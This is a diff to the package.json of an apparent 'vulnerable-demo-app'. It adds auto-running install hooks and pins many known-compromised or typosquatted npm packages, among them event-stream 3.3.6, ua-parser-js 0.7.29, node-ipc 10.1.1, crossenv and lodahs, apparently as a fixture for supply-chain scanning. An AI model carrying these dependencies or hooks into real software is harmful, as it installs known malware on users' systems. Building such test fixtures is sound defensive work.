@@ -10,6 +10,11 @@
 {
   "name": "vulnerable-demo-app",
   "version": "1.0.0",
+  "scripts": {
+    "preinstall": "node scripts/setup.js",
+    "postinstall": "sh scripts/post-setup.sh",
+    "install": "node compile.js"
+  },
   "dependencies": {
     "event-stream": "3.3.6",
     "ua-parser-js": "0.7.29",
@@ -18,7 +23,19 @@
     "colors": "1.4.1",
     "node-ipc": "10.1.1",
     "faker": "6.6.6",
-    "flatmap-stream": "0.1.1"
+    "flatmap-stream": "0.1.1",
+    "@lottiefiles/lottie-player": "2.0.4",
+    "@rspack/core": "1.1.8",
+    "@rspack/cli": "1.1.8",
+    "eslint-scope": "3.7.2",
+    "@ledgerhq/connect-kit": "1.1.5",
+    "crossenv": "1.0.0",
+    "cross-env.js": "1.0.0",
+    "lodahs": "0.0.1",
+    "expresss": "0.0.1",
+    "es5-ext": "0.10.53",
+    "eslint-config-prettier": "8.10.1",
+    "peacenotwar": "1.0.0"
   },
   "devDependencies": {
     "lodash": "4.17.20",
